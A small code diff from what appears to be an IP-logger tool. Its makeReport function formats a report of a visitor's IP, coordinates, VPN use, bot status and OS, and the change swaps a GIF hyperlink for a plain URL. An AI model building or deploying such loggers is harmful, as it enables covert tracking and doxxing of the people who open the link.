@@ -162,7 +162,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`  
-> [🌀 Click for Bot Vibes](https://tenor.com/view/cars-gif-9831011217898319596)
+> https://tenor.com/view/cars-gif-9831011217898319596
 
 **PC Info:**
 > **OS:** `{os}`
